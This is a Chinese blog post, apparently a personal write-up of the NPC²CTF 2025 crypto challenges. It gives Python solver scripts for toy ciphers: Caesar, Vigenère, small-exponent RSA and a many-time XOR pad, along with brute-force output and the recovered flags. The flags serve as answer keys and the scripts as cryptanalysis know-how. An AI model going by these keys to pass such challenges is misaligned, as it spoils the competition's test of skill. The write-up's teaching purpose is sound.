<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
<link href="/fontawesome/css/brands.css" rel="stylesheet">
<link href="/fontawesome/css/solid.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  

  
  <title>NPC²CTF 2025 WriteUp | 棱晶の小窝</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="自从newstar之后已经好久没见过持续时间这么长的比赛了，比赛还是有难度的，不过最后费了一些劲还是AK了所有的reverse、第二周的misc和crypto，题目都挺有意思的，学习和尝试了很多之前没接触到的内容. Crypto方向：river：由于是对称加密，直接将密文回带就可以得到明文，十六进制转换得到flag{two_dift3rs_0ff_t0_s33_th3_w0rld}. 全网呼叫密码">
<meta property="og:type" content="article">
<meta property="og:title" content="NPC²CTF 2025 WriteUp">
<meta property="og:url" content="https://astralprisma.github.io/2025/03/11/npcctf_25/index.html">
<meta property="og:site_name" content="棱晶の小窝">
<meta property="og:description" content="自从newstar之后已经好久没见过持续时间这么长的比赛了，比赛还是有难度的，不过最后费了一些劲还是AK了所有的reverse、第二周的misc和crypto，题目都挺有意思的，学习和尝试了很多之前没接触到的内容. Crypto方向：river：由于是对称加密，直接将密文回带就可以得到明文，十六进制转换得到flag{two_dift3rs_0ff_t0_s33_th3_w0rld}. 全网呼叫密码">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://astralprisma.github.io/source/pictures/npc25_mtp1.png">
<meta property="og:image" content="https://astralprisma.github.io/source/pictures/npc25_mtp2.png">
<meta property="og:image" content="https://astralprisma.github.io/source/pictures/npc25_mtp3.png">
<meta property="article:published_time" content="2025-03-10T16:00:00.000Z">
<meta property="article:modified_time" content="2025-04-20T19:12:24.605Z">
<meta property="article:author" content="Astral Prisma">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://astralprisma.github.io/source/pictures/npc25_mtp1.png">
  
  
    <link rel="shortcut icon" href="/XH.png">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/OTSA.png" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="shadow   ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>棱晶の小窝 </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/AP.png></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Astral Prisma </div>
      <div class="dot"></div>
      <div class="subtitle">星界棱晶 </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/454936579" title="Bilibili"><image src=https://www.bilibili.com/favicon.ico></image></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://www.primegrid.com/show_user.php?userid=1243718" title="PrimeGrid"><image src=https://www.primegrid.com/images/favicon_32.png></image></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/AstralPrisma" title="GitHub"><image src=https://github.githubassets.com/favicons/favicon.png></image></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">分类</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/Ideas-%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/">
                Ideas, 出题记录
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/WriteUp/">
                WriteUp
                <div class="category-count">32</div>
            </a>
        
            <a class="category-link" href="/categories/Ideas/">
                Ideas
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/">
                出题记录
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       

<article id="post-npcctf_25" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        NPC²CTF 2025 WriteUp
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2025-03-10T16:00:00.000Z" itemprop="datePublished">2025-03-11</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/WriteUp/">WriteUp</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            31k 词 
          </div>
        </div>
        
      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <p><em>自从newstar之后已经好久没见过持续时间这么长的比赛了，比赛还是有难度的，不过最后费了一些劲还是AK了所有的reverse、第二周的misc和crypto，题目都挺有意思的，学习和尝试了很多之前没接触到的内容.</em></p>
<h1 id="Crypto方向："><a href="#Crypto方向：" class="headerlink" title="Crypto方向："></a>Crypto方向：</h1><h2 id="river："><a href="#river：" class="headerlink" title="river："></a>river：</h2><p>由于是对称加密，直接将密文回带就可以得到明文，十六进制转换得到<font color=deepskyblue><strong>flag{two_dift3rs_0ff_t0_s33_th3_w0rld}</strong></font>.</p>
<h2 id="全网呼叫密码人："><a href="#全网呼叫密码人：" class="headerlink" title="全网呼叫密码人："></a>全网呼叫密码人：</h2><p>如脚本所示：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一部分：凯撒加密</span></span><br><span class="line">flag1 = <span class="built_in">bytearray</span>(<span class="string">b&quot;dj_ey//)&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag1)):</span><br><span class="line">    flag1[i] += <span class="number">2</span></span><br><span class="line"><span class="comment">#第二部分：维尼吉亚密码（在线求解，https://www.guballa.de/vigenere-solver，密码为crypto）</span></span><br><span class="line">flag2 = <span class="built_in">bytearray</span>(<span class="string">b&quot;belie5!_&quot;</span>)</span><br><span class="line"><span class="comment">#第三部分：AES_CBC，cyberchef求解</span></span><br><span class="line">flag3 = <span class="built_in">bytearray</span>(<span class="string">b&quot;U_are_th&quot;</span>)</span><br><span class="line"><span class="comment">#第四部分：RSA，m、e过小</span></span><br><span class="line">flag4 = <span class="built_in">bytearray</span>(<span class="string">b&#x27;\x0f\xe5Q\xa5_\x16q\xb0\x11\xbd\xdbO\xe803\xf7\xbf\x16R\xdd\xac\x1a\x96\xf9&#x27;</span>)</span><br><span class="line">enc = bytes_to_long(flag4)</span><br><span class="line">m, tag = gmpy2.iroot(enc, <span class="number">3</span>)</span><br><span class="line">flag4 = long_to_bytes(m)</span><br><span class="line"><span class="comment">#第五部分：权重计算</span></span><br><span class="line">encrypted = <span class="string">b&#x27;\x07)\x19\x12D\x18\xdc\xf7r\xe1\x7f\xb0&#125;&#x27;</span></span><br><span class="line">encrypted_long = bytes_to_long(encrypted)</span><br><span class="line">result_bin = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="number">63</span>)):</span><br><span class="line">    <span class="keyword">if</span> encrypted_long &gt;= <span class="number">3</span>**i:</span><br><span class="line">        result_bin = <span class="string">&#x27;1&#x27;</span> + result_bin</span><br><span class="line">        encrypted_long -= <span class="number">3</span>**i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result_bin = <span class="string">&#x27;0&#x27;</span> + result_bin</span><br><span class="line"><span class="keyword">while</span> result_bin.startswith(<span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">    result_bin = result_bin[<span class="number">1</span>:]</span><br><span class="line">flag5 = long_to_bytes(<span class="built_in">int</span>(result_bin, <span class="number">2</span>))</span><br><span class="line"><span class="comment">#第六部分：简单取模</span></span><br><span class="line">g = <span class="number">2</span>**<span class="number">521</span>-<span class="number">1</span></span><br><span class="line">f = <span class="number">2</span>*<span class="number">555</span></span><br><span class="line">p = <span class="number">2</span>**<span class="number">607</span>-<span class="number">1</span></span><br><span class="line">h = g*inverse(f, p) % p</span><br><span class="line">enc = <span class="string">b&#x27;v\x8bM\x07\xd7h\xb4\xd0&#125;wY\xa1\xe7\x17\x86:\x1eqxc\xa1\xe7\x17\x86:\x1eqxc\xa1\xe7\x17\x86:\x1eqxc\xa1\xe7\x17\x86:\x1eqxc\xa1\xe7\x17\x86:\x1eqxc\xa1\xe7\x17\x86:\x1eqxc\xa1\xe7\x17\xe5\x9d\x86\xd2\xe4\xd0\x06\xed&#x27;</span></span><br><span class="line">encl = bytes_to_long(enc)</span><br><span class="line">testmod = <span class="number">103887</span> <span class="comment">#尝试得到</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(testmod, testmod + <span class="number">1</span>):</span><br><span class="line">    testflag = i * p + encl - <span class="number">114514</span> * h</span><br><span class="line">    <span class="keyword">if</span> testflag &gt; <span class="number">0</span>:</span><br><span class="line">        flag6 = long_to_bytes(testflag)</span><br><span class="line"><span class="comment">#第七部分：base64（cyberchef解密）</span></span><br><span class="line">flag7 = <span class="built_in">bytearray</span>(<span class="string">b&quot;ge_and_h&quot;</span>)</span><br><span class="line"><span class="comment">#第八部分：明文</span></span><br><span class="line">flag8 = <span class="built_in">bytearray</span>(<span class="string">b&#x27;ave_fun&#125;&#x27;</span>)</span><br><span class="line"><span class="comment">#拼合得到flag</span></span><br><span class="line">flag = flag1+flag2+flag3+flag4+flag5+flag6+flag7+flag8</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;11+belie5!_U_are_the_best_in_crypto_challenge_and_have_fun&#125;</span></span><br></pre></td></tr></table></figure>
<p>得到flag：<font color=deepskyblue><strong>flag{11+belie5!_U_are_the_best_in_crypto_challenge_and_have_fun}</strong></font>.</p>
<h2 id="OTP？："><a href="#OTP？：" class="headerlink" title="OTP？："></a>OTP？：</h2><p>观察发现是把一长串明文和flag进行循环异或，flag有27字节，明文则是27*22字节，将明文对于flag的已知部分进行异或可以得到一部分明文，发现是英文词句，然后对未知部分进行枚举，限制明文和flag的字符集：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#读取文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_hex_int_from_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    hex_int_array = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">            hex_str = line.strip().lower()</span><br><span class="line">            <span class="keyword">if</span> hex_str.startswith(<span class="string">&#x27;0x&#x27;</span>):</span><br><span class="line">                hex_str = hex_str[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                hex_int = <span class="built_in">int</span>(hex_str, <span class="number">16</span>)</span><br><span class="line">                hex_int_array.append(hex_int)</span><br><span class="line">            <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Error converting line: <span class="subst">&#123;line&#125;</span>. Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> hex_int_array</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&#x27;E:/CTF/c.txt&#x27;</span></span><br><span class="line">hex_array = read_hex_int_from_file(file_path)</span><br><span class="line"><span class="comment">#定义字符集</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_character</span>(<span class="params">byte</span>):</span><br><span class="line">    char = <span class="built_in">chr</span>(byte)</span><br><span class="line">    valid_chars = <span class="built_in">set</span>(<span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ ,.\&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> char <span class="keyword">in</span> valid_chars</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ascii_characters</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(<span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>))</span><br><span class="line"><span class="comment">#先转义已知的部分</span></span><br><span class="line">bytes_arrays = []</span><br><span class="line"><span class="keyword">for</span> idx, value <span class="keyword">in</span> <span class="built_in">enumerate</span>(hex_array):</span><br><span class="line">    bytes_value = <span class="built_in">bytearray</span>(long_to_bytes(value))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bytes_value)):</span><br><span class="line">        <span class="keyword">if</span> i &lt; <span class="number">5</span>:</span><br><span class="line">            bytes_value[i] ^= <span class="built_in">bytearray</span>(<span class="string">b&quot;flag&#123;&quot;</span>)[i]</span><br><span class="line">        <span class="keyword">elif</span> i == <span class="built_in">len</span>(bytes_value) - <span class="number">1</span>:</span><br><span class="line">            bytes_value[i] ^= <span class="built_in">bytearray</span>(<span class="string">b&quot;&#125;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    bytes_arrays.append(bytes_value)</span><br><span class="line"></span><br><span class="line">possible_keys_for_each_byte = [&#123;&#125; <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>)]</span><br><span class="line"><span class="comment">#转义未知的部分</span></span><br><span class="line"><span class="keyword">for</span> byte_index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="number">26</span>):</span><br><span class="line">    possible_keys_and_plaintexts = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> ascii_characters():</span><br><span class="line">        all_match = <span class="literal">True</span></span><br><span class="line">        plaintexts_for_this_key = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> bytes_value <span class="keyword">in</span> bytes_arrays:</span><br><span class="line">            decrypted_byte = bytes_value[byte_index] ^ char</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> is_valid_character(decrypted_byte):</span><br><span class="line">                all_match = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            plaintexts_for_this_key.append(decrypted_byte)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> all_match:</span><br><span class="line">            possible_keys_and_plaintexts.append(</span><br><span class="line">                (<span class="built_in">chr</span>(char), plaintexts_for_this_key))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> possible_keys_and_plaintexts:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;可能的flag字节<span class="subst">&#123;byte_index&#125;</span>:&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> key_char, plaintext_bytes_list <span class="keyword">in</span> possible_keys_and_plaintexts:</span><br><span class="line">            decrypted_message = <span class="built_in">bytearray</span>(</span><br><span class="line">                [plaintext_bytes_list[idx] <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bytes_arrays))])</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;key_char&#125;</span>, 对应明文: <span class="subst">&#123;decrypted_message&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;第<span class="subst">&#123;byte_index&#125;</span>字节未找到有效解&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">可能的flag字节<span class="number">5</span>:M, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27;ere tbOstnn  gyS, ia s&#x27;</span>)</span><br><span class="line">可能的flag字节<span class="number">6</span>:a, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27;reyeiynsh edv  i dgpm &#x27;</span>)</span><br><span class="line">可能的flag字节<span class="number">7</span>:l, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27;q&quot;qlm&quot;ncgifggvpecglrcv&#x27;</span>)</span><br><span class="line">n, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27;s sno laekdeetrgaenpat&#x27;</span>)</span><br><span class="line">可能的flag字节<span class="number">8</span>:y, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27; n,cntyg e&quot;crhennnalir&#x27;</span>)</span><br><span class="line">可能的flag字节<span class="number">9</span>:_, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27;oo i h ecy rievadytila&#x27;</span>)</span><br><span class="line">可能的flag字节<span class="number">10</span>:T, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27;rtspkeh,o.uyf et  uc&quot;n&#x27;</span>)</span><br><span class="line">可能的flag字节<span class="number">11</span>:i, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27;  ihe e rAspycauatra s&#x27;</span>)</span><br><span class="line">可能的flag字节<span class="number">12</span>:m, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27;onneyi sr it olr hetaf&#x27;</span>)</span><br><span class="line">可能的flag字节<span class="number">13</span>:e, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27;tecr nciemnitreese.ine&#x27;</span>)</span><br><span class="line">g, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27;vgap&quot;lakgolkvpggqg,klg&#x27;</span>)</span><br><span class="line">可能的flag字节<span class="number">14</span>:], 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27;jgggrvclqgemjpfqk&quot;&quot;mfp&#x27;</span>)</span><br><span class="line">_, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27;heeeptansegohrdsi  odr&#x27;</span>)</span><br><span class="line">可能的flag字节<span class="number">15</span>:P, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27;ed duencps nie  gvTn &quot;&#x27;</span>)</span><br><span class="line">R, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27;gf&quot;fwglarq&quot;lkg&quot;&quot;etVl&quot; &#x27;</span>)</span><br><span class="line">可能的flag字节<span class="number">16</span>:a, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27;rea bn eosa ssecnahs&quot; &#x27;</span>)</span><br><span class="line">可能的flag字节<span class="number">17</span>:d, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27; d uldd na k pnaeli es&#x27;</span>)</span><br><span class="line">f, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27;&quot;f&quot;wnff&quot;lc&quot;i&quot;rlcgnk&quot;gq&#x27;</span>)</span><br><span class="line">可能的flag字节<span class="number">18</span>:_, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27;s msieeodgpesocnrisily&#x27;</span>)</span><br><span class="line">可能的flag字节<span class="number">19</span>:<span class="number">1</span>, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27;eteicdcnieryinrn d nes&#x27;</span>)</span><br><span class="line">可能的flag字节<span class="number">20</span>:s, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27;cosnl iln i.gdyocih ct&#x27;</span>)</span><br><span class="line">可能的flag字节<span class="number">21</span>:_, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27;u sgyrpygcv niptata&quot;te&#x27;</span>)</span><br><span class="line">可能的flag字节<span class="number">22</span>:f, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27;rta  eh  aaAant nyserm&#x27;</span>)</span><br><span class="line">可能的flag字节<span class="number">23</span>:u, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27;ergarcehdntntgibn  los&#x27;</span>)</span><br><span class="line">可能的flag字节<span class="number">24</span>:n, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27; aeneiree eyu oeoooen.&#x27;</span>)</span><br><span class="line">可能的flag字节<span class="number">25</span>:!, 对应明文: <span class="built_in">bytearray</span>(<span class="string">b&#x27;mn  vp  cblorpn tfbci.&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>则flag为<font color=deepskyblue><strong>flag{Many_Time_Pad_1s_fun!}</strong></font>.</p>
<h2 id="这还不签到？："><a href="#这还不签到？：" class="headerlink" title="这还不签到？："></a>这还不签到？：</h2><p>把加密过程倒过来就行了，脚本：</p>
